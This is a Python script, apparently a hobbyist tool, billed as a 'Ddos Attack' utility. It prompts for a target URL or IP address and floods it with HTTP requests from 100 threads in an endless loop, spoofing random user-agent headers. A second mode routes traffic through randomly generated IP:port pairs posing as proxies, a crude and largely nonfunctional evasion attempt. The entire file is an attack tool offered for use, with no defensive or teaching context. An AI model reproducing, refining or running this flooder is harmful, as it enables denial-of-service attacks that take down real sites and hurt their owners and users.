import urllib.request
import random
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener
from pyfiglet import Figlet
from concurrent.futures import ThreadPoolExecutor as tred
#BY : AHMED
F = '\033[1;32m'
Z = '\033[1;31m'
S = '\033[1;33m'
B = '\x1b[38;5;208m'

fig = Figlet(font='slant')
logo = fig.renderText('Ddos Attack')

print(logo)

def linked():
    sg = input(
        f'''
═════════════════════════════════
{Z}[1] Attack withOut Proxy - هجوم بدون بروكسي
═════════════════════════════════
{S}[2] Attack With Proxy - هجوم مع بروكسي 
═════════════════════════════════
{S}[{S}⌯{S}]{F}ChooSe Number {F}» '''
    )
    if sg == '1':
        AttackMahos()
    elif sg == '2':
        ProxyAttack()

def AttackMahos():
    with tred(max_workers=100) as pool:
        while True:
            pool.submit(attack)

def attack():
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-us,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive': '115',
        'Connection': 'keep-alive',
        'User-Agent': generate_user_agent()
    }
    try:
        req = urllib.request.urlopen(
            urllib.request.Request(url, headers=headers)
        )
        if req.status == 200:
            print(f'{F}GOOD Attack: {url}')
        else:
            print(f'{Z}BAD Attack: {url}')
    except:
        print(f'{S}DOWN: {url}')
        pass

def ProxyAttack():
    with tred(max_workers=100) as pool:
        while True:
            pool.submit(proxy_attack)

def proxy_attack():
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
    port = random.choice(pl)
    proxy = ip + ":" + str(port)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-us,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive': '115',
        'Connection': 'keep-alive',
        'User-Agent': generate_user_agent()
    }
    try:
        prox = ProxyHandler({'http': 'http://' + proxy})
        opener = build_opener(prox)
        req = opener.open(urllib.request.Request(url, headers=headers))
        if req.status == 200:
            print(f'{F}GOOD Attack: {url} | {proxy}')
        else:
            print(f'{Z}BAD Attack: {url} | {proxy}')
    except:
        print(f'{S}DOWN: {url} | {proxy}')
        pass

url = input(f'{B}ENTER URL OR IP ADDRESS : ')
linked()